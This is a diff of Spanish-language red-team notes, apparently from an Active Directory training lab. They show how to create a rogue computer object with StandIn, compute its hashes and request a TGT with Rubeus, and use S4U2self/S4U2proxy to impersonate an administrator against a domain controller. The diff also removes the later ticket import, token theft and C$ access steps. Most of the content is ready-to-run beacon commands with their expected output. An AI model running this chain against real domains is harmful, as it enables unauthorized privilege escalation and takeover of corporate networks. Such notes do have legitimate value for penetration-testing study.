@@ -1,6 +1,9 @@
 # Crear objeto de equipo y continuar el ataque
 
-Si no tienes acceso como administrador local a un equipo, puedes crear tu propio objeto de equipo. De manera predeterminada, incluso los usuarios de dominio pueden unir hasta 10 equipos al dominio, controlado por el atributo `ms-DS-MachineAccountQuota` del objeto de dominio.
+> Si no tienes acceso como administrador local a un equipo, puedes crear tu propio objeto de equipo.  
+> De manera predeterminada, incluso los usuarios de dominio pueden unir hasta 10 equipos al dominio, controlado por el atributo `ms-DS-MachineAccountQuota` del objeto de dominio.
+
+### Comprobar el atributo `ms-DS-MachineAccountQuota`:
 
 ```powershell
 beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
@@ -14,9 +17,13 @@ ms-ds-machineaccountquota
                        10
 ```
 
+---
+
 ## Crear un nuevo objeto de equipo
 
 **StandIn** es un toolkit post-explotación creado por Ruben Boonen que permite crear un equipo con una contraseña aleatoria.
+
+### Comando para crear el objeto:
 
 ```powershell
 beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
@@ -33,9 +40,13 @@ beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.ex
 [+] Machine account added to AD..
 ```
 
+---
+
 ## Calcular los hashes para el objeto de equipo
 
-Usa **Rubeus** para calcular los hashes asociados con el nuevo equipo.
+> Usa **Rubeus** para calcular los hashes asociados con el nuevo equipo. Estos hashes se usarán posteriormente para generar tickets.
+
+### Comando:
 
 ```powershell
 PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
@@ -56,9 +67,13 @@ PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /passwo
 [*]       des_cbc_md5          : 49B5514F1F45700D
 ```
 
+---
+
 ## Solicitar un TGT para el objeto de equipo falso
 
-Usa el hash AES calculado para solicitar un TGT (Ticket Granting Ticket).
+> Una vez calculado el hash AES, se puede usar para solicitar un **TGT (Ticket Granting Ticket)**.
+
+### Comando:
 
 ```powershell
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
@@ -90,6 +105,8 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /u
   ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
 ```
 
+---
+
 ## Realizar la Suplantación S4U (Service for User)
 
 ### Paso 1: Usar el TGT para obtener un TGS con S4U2self
@@ -111,6 +128,8 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user
 [*] base64(ticket.kirbi): doIGcD[...]MuaW8=
 ```
 
+---
+
 ### Paso 2: Usar el TGS para obtener acceso a recursos con S4U2proxy
 
 Con el TGS generado, podemos realizar la solicitud S4U2proxy para acceder a los recursos objetivo como el usuario suplantado.
@@ -130,73 +149,9 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user
 [*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io': doIFdD[...]Jw2m8=
 ```
 
-## Importar el Ticket y Acceder a Recursos
-
-### Paso 1: Importar el ticket en una sesión
-
-```powershell
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:Administrator /password:FakePass /ticket:doIFdD[...]Jw2m8=
-```
-
-**Salida esperada:**
-
-```plaintext
-[*] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
-[+] Ticket successfully imported!
-[+] LUID            : 0x6cb934
-```
-
-### Paso 2: Cambiar al contexto del token importado
-
-```powershell
-beacon> steal_token 4092
-```
-
-**Salida esperada:**
-
-```plaintext
-[+] Impersonated DEV\Administrator
-```
-
-### Paso 3: Acceder al recurso objetivo
-
-Por ejemplo, listar los archivos compartidos en DC-2:
-
-```powershell
-beacon> ls \\dc-2.dev.cyberbotic.io\c$
-```
-
-**Salida esperada:**
-
-```plaintext
- Size     Type    Last Modified         Name
- ----     ----    -------------         ----
-          dir     08/15/2022 15:44:08   $Recycle.Bin
-          dir     08/10/2022 04:55:17   $WinREAgent
-          dir     08/10/2022 05:05:53   Boot
-          dir     08/18/2021 23:34:55   Documents and Settings
-          dir     08/19/2021 06:24:49   EFI
-          dir     08/15/2022 16:09:55   inetpub
-          dir     05/08/2021 08:20:24   PerfLogs
-          dir     08/24/2022 10:51:51   Program Files
-          dir     08/10/2022 04:06:16   Program Files (x86)
-          dir     09/12/2022 09:45:09   ProgramData
-          dir     08/15/2022 15:23:23   Recovery
-          dir     08/16/2022 12:37:38   Shares
-          dir     09/05/2022 12:03:43   System Volume Information
-          dir     08/15/2022 15:24:39   Users
-          dir     09/12/2022 09:28:56   Windows
- 427kb    fil     08/10/2022 05:00:07   bootmgr
- 1b       fil     05/08/2021 08:14:33   BOOTNXT
- 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
- 12kb     fil     09/05/2022 07:25:58   DumpStack.log
- 12kb     fil     09/13/2022 09:25:49   DumpStack.log.tmp
- 384mb    fil     09/13/2022 09:25:49   pagefile.sys
-```
+---
 
 ## Limpieza
-
-Finalmente, limpia los rastros eliminando el objeto del equipo falso y cualquier configuración modificada.
 
 ### Paso 1: Eliminar el objeto del equipo falso
 
